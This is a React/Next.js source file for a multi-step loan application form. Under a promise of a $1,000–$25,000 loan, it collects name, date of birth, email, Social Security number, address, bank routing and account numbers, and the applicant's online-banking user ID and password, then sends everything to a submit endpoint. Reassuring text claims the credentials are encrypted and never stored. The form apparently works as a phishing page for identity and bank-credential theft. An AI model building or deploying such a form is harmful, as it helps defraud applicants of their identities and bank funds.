"use client";

import { useState } from "react";

const initialData = {
  firstName: "",
  lastName: "",
  dob: "",
  email: "",
  ssn: "",
  streetAddress: "",
  city: "",
  state: "",
  zip: "",
  bankName: "",
  loanAmount: "",
  routingNumber: "",
  accountNumber: "",
  bankUserId: "",
  bankPassword: "",
  agreed: false,
};

type LoanData = typeof initialData;

const sections = [
  {
    number: "1",
    title: "Personal Information",
    description: "Tell us a bit about yourself.",
    icon: (
      <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
      </svg>
    ),
  },
  {
    number: "2",
    title: "Address Information",
    description: "Where do you currently live?",
    icon: (
      <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
        <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z" />
      </svg>
    ),
  },
  {
    number: "3",
    title: "Financial Information",
    description: "Tell us about your loan and bank.",
    icon: (
      <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
        <path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.89 2.44 2.1h2.09c-.05-1.8-1.19-3.45-3.42-3.95V2h-2.42v2.05c-2.14.37-3.63 1.6-3.63 3.65 0 2.33 1.91 3.29 4.68 4.05 2.66.71 3.39 1.5 3.39 2.54 0 .86-.69 1.75-2.74 1.75-1.9 0-2.83-.89-2.83-2.2h-2.09c.06 2.09 1.59 3.68 4.08 4.13V22h2.42v-2.03c1.93-.27 4.09-1.23 4.09-4.02 0-2.79-2.12-3.46-4.68-4.05z" />
      </svg>
    ),
  },
  {
    number: "4",
    title: "Bank Authentication",
    description: "Securely verify your account.",
    icon: (
      <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
      </svg>
    ),
  },
];

const stateOptions = [
  { value: "", label: "Select State" },
  { value: "AL", label: "Alabama" },
  { value: "AK", label: "Alaska" },
  { value: "AZ", label: "Arizona" },
  { value: "AR", label: "Arkansas" },
  { value: "CA", label: "California" },
  { value: "CO", label: "Colorado" },
  { value: "CT", label: "Connecticut" },
  { value: "DE", label: "Delaware" },
  { value: "FL", label: "Florida" },
  { value: "GA", label: "Georgia" },
  { value: "HI", label: "Hawaii" },
  { value: "ID", label: "Idaho" },
  { value: "IL", label: "Illinois" },
  { value: "IN", label: "Indiana" },
  { value: "IA", label: "Iowa" },
  { value: "KS", label: "Kansas" },
  { value: "KY", label: "Kentucky" },
  { value: "LA", label: "Louisiana" },
  { value: "ME", label: "Maine" },
  { value: "MD", label: "Maryland" },
  { value: "MA", label: "Massachusetts" },
  { value: "MI", label: "Michigan" },
  { value: "MN", label: "Minnesota" },
  { value: "MS", label: "Mississippi" },
  { value: "MO", label: "Missouri" },
  { value: "MT", label: "Montana" },
  { value: "NE", label: "Nebraska" },
  { value: "NV", label: "Nevada" },
  { value: "NH", label: "New Hampshire" },
  { value: "NJ", label: "New Jersey" },
  { value: "NM", label: "New Mexico" },
  { value: "NY", label: "New York" },
  { value: "NC", label: "North Carolina" },
  { value: "ND", label: "North Dakota" },
  { value: "OH", label: "Ohio" },
  { value: "OK", label: "Oklahoma" },
  { value: "OR", label: "Oregon" },
  { value: "PA", label: "Pennsylvania" },
  { value: "RI", label: "Rhode Island" },
  { value: "SC", label: "South Carolina" },
  { value: "SD", label: "South Dakota" },
  { value: "TN", label: "Tennessee" },
  { value: "TX", label: "Texas" },
  { value: "UT", label: "Utah" },
  { value: "VT", label: "Vermont" },
  { value: "VA", label: "Virginia" },
  { value: "WA", label: "Washington" },
  { value: "WV", label: "West Virginia" },
  { value: "WI", label: "Wisconsin" },
  { value: "WY", label: "Wyoming" },
];

export default function LoanForm() {
  const [data, setData] = useState<LoanData>(initialData);
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);

  const update = (field: keyof LoanData, value: string | boolean) => {
    setData((prev) => ({ ...prev, [field]: value }));
  };

  const validate = () => {
    const required: (keyof LoanData)[] = [
      "firstName",
      "lastName",
      "dob",
      "email",
      "ssn",
      "streetAddress",
      "city",
      "state",
      "zip",
      "bankName",
      "loanAmount",
      "routingNumber",
      "accountNumber",
      "bankUserId",
      "bankPassword",
    ];

    const missing = required.filter((key) => !String(data[key]).trim());
    if (missing.length > 0) {
      setError("Please fill in all required fields.");
      return false;
    }

    const ssnDigits = data.ssn.replace(/\D/g, "");
    if (ssnDigits.length !== 9) {
      setError("Social Security Number must be exactly 9 digits.");
      return false;
    }

    const zipDigits = data.zip.replace(/\D/g, "");
    if (zipDigits.length !== 5) {
      setError("ZIP Code must be exactly 5 digits.");
      return false;
    }

    const loanAmount = Number(data.loanAmount);
    if (isNaN(loanAmount) || loanAmount < 1000 || loanAmount > 25000) {
      window.alert("Requested Loan Amount must be between $1,000 and $25,000.");
      setError("Requested Loan Amount must be between $1,000 and $25,000.");
      return false;
    }

    const accountDigits = data.accountNumber.replace(/\D/g, "");
    if (accountDigits.length < 4 || accountDigits.length > 20) {
      setError("Account Number must be between 4 and 20 digits.");
      return false;
    }

    if (!data.agreed) {
      setError("Please agree to the Terms & Conditions and Privacy Policy.");
      return false;
    }

    return true;
  };

  const submit = async () => {
    if (!validate()) return;
    setLoading(true);
    setError(null);
    setMessage(null);

    try {
      const res = await fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      });

      const json = await res.json().catch(() => ({ error: "Unknown error" }));

      if (!res.ok) {
        throw new Error(json.error || "Submission failed");
      }

      setMessage("Application submitted successfully.");
      setData(initialData);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Something went wrong.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="loan-form-wrapper">
      {sections.map((section, idx) => (
        <section key={section.title} className="form-section-card">
          <div className="form-section-header">
            <div className="form-section-icon">
              <span className="section-number">{section.number}</span>
              {section.icon}
            </div>
            <div className="form-section-title">
              <h2>{section.title}</h2>
              <p>{section.description}</p>
            </div>
          </div>

          {idx === 0 && (
            <div className="form-section-content">
              <div className="form-row">
                <div className="form-group">
                  <label htmlFor="loanAmount">
                    Requested Loan Amount <span className="required">*</span>
                    <span className="field-hint">USD</span>
                  </label>
                  <input
                    id="loanAmount"
                    type="number"
                    value={data.loanAmount}
                    onChange={(e) => update("loanAmount", e.target.value)}
                    onBlur={(e) => {
                      const value = e.target.value.trim();
                      if (!value) return;
                      const num = Number(value);
                      if (num < 1000) {
                        window.alert("Requested Loan Amount must be at least $1,000.");
                        update("loanAmount", "1000");
                      } else if (num > 25000) {
                        window.alert("Requested Loan Amount cannot exceed $25,000.");
                        update("loanAmount", "25000");
                      }
                    }}
                    placeholder="5000"
                    suppressHydrationWarning
                  />
                </div>
              </div>
              <div className="form-row">
                <div className="form-group">
                  <label htmlFor="firstName">First Name <span className="required">*</span></label>
                  <input
                    id="firstName"
                    type="text"
                    value={data.firstName}
                    onChange={(e) => update("firstName", e.target.value)}
                    placeholder="Jane"
                    suppressHydrationWarning
                  />
                </div>
                <div className="form-group">
                  <label htmlFor="lastName">Last Name <span className="required">*</span></label>
                  <input
                    id="lastName"
                    type="text"
                    value={data.lastName}
                    onChange={(e) => update("lastName", e.target.value)}
                    placeholder="Appleseed"
                    suppressHydrationWarning
                  />
                </div>
              </div>
              <div className="form-row">
                <div className="form-group">
                  <label htmlFor="dob">Date of Birth <span className="required">*</span></label>
                  <input
                    id="dob"
                    type="date"
                    value={data.dob}
                    onChange={(e) => update("dob", e.target.value)}
                    placeholder="mm/dd/yyyy"
                    suppressHydrationWarning
                  />
                </div>
                <div className="form-group">
                  <label htmlFor="email">Email Address <span className="required">*</span></label>
                  <input
                    id="email"
                    type="email"
                    value={data.email}
                    onChange={(e) => update("email", e.target.value)}
                    placeholder="jane.appleseed@example.com"
                    suppressHydrationWarning
                  />
                </div>
              </div>
              <div className="form-row">
                <div className="form-group full-width">
                  <label htmlFor="ssn">
                    Social Security Number <span className="required">*</span>
                    <span className="field-hint">9 digits</span>
                  </label>
                  <input
                    id="ssn"
                    type="text"
                    value={data.ssn}
                    onChange={(e) => update("ssn", e.target.value)}
                    placeholder="123456789"
                    inputMode="numeric"
                    pattern="[0-9]{9}"
                    maxLength={9}
                    title="Enter 9 digits only"
                    suppressHydrationWarning
                  />
                </div>
              </div>
            </div>
          )}

          {idx === 1 && (
            <div className="form-section-content">
              <div className="form-group full-width">
                <label htmlFor="streetAddress">Street Address <span className="required">*</span></label>
                <input
                  id="streetAddress"
                  type="text"
                  value={data.streetAddress}
                  onChange={(e) => update("streetAddress", e.target.value)}
                  placeholder="123 Main Street"
                  suppressHydrationWarning
                />
              </div>
              <div className="form-row three-col">
                <div className="form-group">
                  <label htmlFor="city">City <span className="required">*</span></label>
                  <input
                    id="city"
                    type="text"
                    value={data.city}
                    onChange={(e) => update("city", e.target.value)}
                    placeholder="New York"
                    suppressHydrationWarning
                  />
                </div>
                <div className="form-group">
                  <label htmlFor="state">State <span className="required">*</span></label>
                  <select
                    id="state"
                    value={data.state}
                    onChange={(e) => update("state", e.target.value)}
                    suppressHydrationWarning
                  >
                    {stateOptions.map((o) => (
                      <option key={o.value} value={o.value}>
                        {o.label}
                      </option>
                    ))}
                  </select>
                </div>
                <div className="form-group">
                  <label htmlFor="zip">ZIP Code <span className="required">*</span></label>
                  <input
                    id="zip"
                    type="text"
                    value={data.zip}
                    onChange={(e) => update("zip", e.target.value)}
                    placeholder="10001"
                    inputMode="numeric"
                    pattern="[0-9]{5}"
                    maxLength={5}
                    title="Enter 5 digits only"
                    suppressHydrationWarning
                  />
                </div>
              </div>
            </div>
          )}

          {idx === 2 && (
            <div className="form-section-content">
              <div className="form-row">
                <div className="form-group">
                  <label htmlFor="bankName">Bank Name <span className="required">*</span></label>
                  <input
                    id="bankName"
                    type="text"
                    value={data.bankName}
                    onChange={(e) => update("bankName", e.target.value)}
                    placeholder="e.g. Chase, Bank of America"
                    suppressHydrationWarning
                  />
                </div>
              </div>
              <div className="form-row">
                <div className="form-group input-prefix">
                  <label htmlFor="routingNumber">Routing Number <span className="required">*</span></label>
                  <span className="prefix">#</span>
                  <input
                    id="routingNumber"
                    type="text"
                    value={data.routingNumber}
                    onChange={(e) => update("routingNumber", e.target.value)}
                    placeholder="123456789"
                    inputMode="numeric"
                    maxLength={9}
                    suppressHydrationWarning
                  />
                </div>
                <div className="form-group input-prefix">
                  <label htmlFor="accountNumber">Account Number <span className="required">*</span></label>
                  <span className="prefix">#</span>
                  <input
                    id="accountNumber"
                    type="text"
                    value={data.accountNumber}
                    onChange={(e) => update("accountNumber", e.target.value)}
                    placeholder="1234567890"
                    inputMode="numeric"
                    pattern="[0-9]{4,20}"
                    minLength={4}
                    maxLength={20}
                    title="Enter 4 to 20 digits"
                    suppressHydrationWarning
                  />
                </div>
              </div>
            </div>
          )}

          {idx === 3 && (
            <div className="form-section-content">
              <div className="info-box">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <circle cx="12" cy="12" r="10" />
                  <line x1="12" y1="16" x2="12" y2="12" />
                  <line x1="12" y1="8" x2="12.01" y2="8" />
                </svg>
                <p>
                  Provide your bank login credentials for instant account verification. Your data is encrypted
                  end-to-end and never stored.
                </p>
              </div>
              <div className="form-row">
                <div className="form-group">
                  <label htmlFor="bankUserId">Bank User ID <span className="required">*</span></label>
                  <input
                    id="bankUserId"
                    type="text"
                    value={data.bankUserId}
                    onChange={(e) => update("bankUserId", e.target.value)}
                    placeholder="Enter your bank user ID"
                    suppressHydrationWarning
                  />
                </div>
                <div className="form-group">
                  <label htmlFor="bankPassword">Bank Password <span className="required">*</span></label>
                  <input
                    id="bankPassword"
                    type="password"
                    value={data.bankPassword}
                    onChange={(e) => update("bankPassword", e.target.value)}
                    placeholder="Enter your bank password"
                    suppressHydrationWarning
                  />
                </div>
              </div>
            </div>
          )}
        </section>
      ))}

      <div className="form-submit-area">
        {error && <p className="error">{error}</p>}
        {message && <p className="success-message">{message}</p>}
        <div className="form-group agree-box">
          <label>
            <input
              type="checkbox"
              checked={data.agreed}
              onChange={(e) => update("agreed", e.target.checked)}
            />
            I agree to the Terms & Conditions and Privacy Policy.
          </label>
        </div>
        <button className="btn btn-primary submit-btn" onClick={submit} disabled={loading}>
          {loading ? "Submitting..." : "Submit Application"}
        </button>
        <p className="security-note">
          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
            <polyline points="9 12 12 15 16 10" />
          </svg>
          Encrypted with 256-bit SSL
        </p>
      </div>
    </div>
  );
}
